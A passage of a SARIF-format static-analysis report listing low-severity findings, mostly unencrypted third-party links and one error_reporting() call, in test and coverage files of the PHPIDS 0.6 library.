                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1198
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4764",
      "message" : {
        "text" : "The file MonitorTest.php on line 1203 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE15F9"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1203,
            "endLine" : 1203,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1203"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1203
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1203"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1203
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4765",
      "message" : {
        "text" : "The file MonitorTest.php on line 1207 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE15FA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1207,
            "endLine" : 1207,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1207"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1207
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1207"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1207
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4766",
      "message" : {
        "text" : "The file MonitorTest.php on line 1211 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE15FB"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1211,
            "endLine" : 1211,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1211"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1211
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1211"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1211
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4767",
      "message" : {
        "text" : "The file MonitorTest.php on line 1211 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE15FC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1211,
            "endLine" : 1211,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1211"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1211
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1211"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1211
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4768",
      "message" : {
        "text" : "The file MonitorTest.php on line 1235 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE15FD"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1235,
            "endLine" : 1235,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1235"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1235
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1235"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1235
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4769",
      "message" : {
        "text" : "The file MonitorTest.php on line 1238 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE15FE"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1238,
            "endLine" : 1238,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1238"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1238
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1238"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1238
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4770",
      "message" : {
        "text" : "The file MonitorTest.php on line 1242 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE15FF"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1242,
            "endLine" : 1242,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1242"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1242
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1242"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1242
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4771",
      "message" : {
        "text" : "The file MonitorTest.php on line 1245 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE1600"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1245,
            "endLine" : 1245,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1245"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1245
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1245"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1245
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4772",
      "message" : {
        "text" : "The file MonitorTest.php on line 1245 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE1601"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1245,
            "endLine" : 1245,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1245"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1245
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1245"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1245
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4773",
      "message" : {
        "text" : "The file MonitorTest.php on line 1254 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FEF7E47D79559BC47E66776442EE1602"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
          },
          "region" : {
            "startLine" : 1254,
            "endLine" : 1254,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1254"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1254
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MonitorTest.php:1254"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/IDS/MonitorTest.php"
                },
                "region" : {
                  "startLine" : 1254
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4392",
      "message" : {
        "text" : "The program might reveal system data or debugging information in allTests.php with a call to error_reporting() on line 21. The information revealed by error_reporting() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1566FE131368FA69594FEC985E0F31F6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/allTests.php"
          },
          "region" : {
            "startLine" : 21,
            "endLine" : 21,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "allTests.php:21 - error_reporting()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/allTests.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "allTests.php:21 - error_reporting()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/allTests.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4717",
      "message" : {
        "text" : "The file Caching.html on line 224 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E946CCC02E9345FE462B1E66D21FF683"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching.html"
          },
          "region" : {
            "startLine" : 224,
            "endLine" : 224,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching.html:224"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching.html"
                },
                "region" : {
                  "startLine" : 224
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching.html:224"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching.html"
                },
                "region" : {
                  "startLine" : 224
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4718",
      "message" : {
        "text" : "The file Caching.html on line 224 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E946CCC02E9345FE462B1E66D21FF684"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching.html"
          },
          "region" : {
            "startLine" : 224,
            "endLine" : 224,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching.html:224"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching.html"
                },
                "region" : {
                  "startLine" : 224
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching.html:224"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching.html"
                },
                "region" : {
                  "startLine" : 224
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4701",
      "message" : {
        "text" : "The file Caching_Factory.php.html on line 256 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E0CC8AABBA787CAB1CB5ABB8AC5E4B0D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching_Factory.php.html"
          },
          "region" : {
            "startLine" : 256,
            "endLine" : 256,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching_Factory.php.html:256"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Factory.php.html"
                },
                "region" : {
                  "startLine" : 256
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching_Factory.php.html:256"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Factory.php.html"
                },
                "region" : {
                  "startLine" : 256
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4702",
      "message" : {
        "text" : "The file Caching_Factory.php.html on line 256 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E0CC8AABBA787CAB1CB5ABB8AC5E4B0E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching_Factory.php.html"
          },
          "region" : {
            "startLine" : 256,
            "endLine" : 256,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching_Factory.php.html:256"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Factory.php.html"
                },
                "region" : {
                  "startLine" : 256
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching_Factory.php.html:256"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Factory.php.html"
                },
                "region" : {
                  "startLine" : 256
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4527",
      "message" : {
        "text" : "The file Caching_File.php.html on line 451 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "68330A4408C794078BA7230A5CA89AC1"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching_File.php.html"
          },
          "region" : {
            "startLine" : 451,
            "endLine" : 451,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching_File.php.html:451"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_File.php.html"
                },
                "region" : {
                  "startLine" : 451
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching_File.php.html:451"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_File.php.html"
                },
                "region" : {
                  "startLine" : 451
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4528",
      "message" : {
        "text" : "The file Caching_File.php.html on line 451 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "68330A4408C794078BA7230A5CA89AC2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching_File.php.html"
          },
          "region" : {
            "startLine" : 451,
            "endLine" : 451,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching_File.php.html:451"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_File.php.html"
                },
                "region" : {
                  "startLine" : 451
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching_File.php.html:451"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_File.php.html"
                },
                "region" : {
                  "startLine" : 451
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4743",
      "message" : {
        "text" : "The file Caching_Interface.php.html on line 182 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F2ED2033A99EE6EF39E0BFD63C99672C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching_Interface.php.html"
          },
          "region" : {
            "startLine" : 182,
            "endLine" : 182,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching_Interface.php.html:182"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Interface.php.html"
                },
                "region" : {
                  "startLine" : 182
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching_Interface.php.html:182"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Interface.php.html"
                },
                "region" : {
                  "startLine" : 182
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4744",
      "message" : {
        "text" : "The file Caching_Interface.php.html on line 182 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F2ED2033A99EE6EF39E0BFD63C99672D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching_Interface.php.html"
          },
          "region" : {
            "startLine" : 182,
            "endLine" : 182,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching_Interface.php.html:182"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Interface.php.html"
                },
                "region" : {
                  "startLine" : 182
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching_Interface.php.html:182"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Interface.php.html"
                },
                "region" : {
                  "startLine" : 182
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4693",
      "message" : {
        "text" : "The file Caching_Session.php.html on line 375 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "DC32A6EE462A7FB78159A2055976154A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching_Session.php.html"
          },
          "region" : {
            "startLine" : 375,
            "endLine" : 375,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching_Session.php.html:375"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Session.php.html"
                },
                "region" : {
                  "startLine" : 375
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching_Session.php.html:375"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Session.php.html"
                },
                "region" : {
                  "startLine" : 375
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4694",
      "message" : {
        "text" : "The file Caching_Session.php.html on line 375 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "DC32A6EE462A7FB78159A2055976154B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Caching_Session.php.html"
          },
          "region" : {
            "startLine" : 375,
            "endLine" : 375,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Caching_Session.php.html:375"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Session.php.html"
                },
                "region" : {
                  "startLine" : 375
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Caching_Session.php.html:375"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Caching_Session.php.html"
                },
                "region" : {
                  "startLine" : 375
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4494",
      "message" : {
        "text" : "The file Converter.php.html on line 1225 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5AE732F96F4358989B4B073A4F73CD57"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Converter.php.html"
          },
          "region" : {
            "startLine" : 1225,
            "endLine" : 1225,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Converter.php.html:1225"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Converter.php.html"
                },
                "region" : {
                  "startLine" : 1225
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php.html:1225"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Converter.php.html"
                },
                "region" : {
                  "startLine" : 1225
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4495",
      "message" : {
        "text" : "The file Converter.php.html on line 1225 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5AE732F96F4358989B4B073A4F73CD58"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Converter.php.html"
          },
          "region" : {
            "startLine" : 1225,
            "endLine" : 1225,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Converter.php.html:1225"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Converter.php.html"
                },
                "region" : {
                  "startLine" : 1225
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php.html:1225"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Converter.php.html"
                },
                "region" : {
                  "startLine" : 1225
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4438",
      "message" : {
        "text" : "The file Event.php.html on line 552 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "30B96C660F154D1F40C0CC855FB2A536"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Event.php.html"
          },
          "region" : {
            "startLine" : 552,
            "endLine" : 552,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Event.php.html:552"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Event.php.html"
                },
                "region" : {
                  "startLine" : 552
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Event.php.html:552"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Event.php.html"
                },
                "region" : {
                  "startLine" : 552
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4439",
      "message" : {
        "text" : "The file Event.php.html on line 552 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "30B96C660F154D1F40C0CC855FB2A537"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Event.php.html"
          },
          "region" : {
            "startLine" : 552,
            "endLine" : 552,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Event.php.html:552"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Event.php.html"
                },
                "region" : {
                  "startLine" : 552
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Event.php.html:552"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Event.php.html"
                },
                "region" : {
                  "startLine" : 552
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4558",
      "message" : {
        "text" : "The file Filter.html on line 97 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "79E7F0D6FE8B64B1E7F8D8BFCED45684"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/tests/coverage/Filter.html"
          },
          "region" : {
            "startLine" : 97,
            "endLine" : 97,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Filter.html:97"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/tests/coverage/Filter.html"
                },
                "region" : {
                  "startLine" : 97
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Filter.html:97"
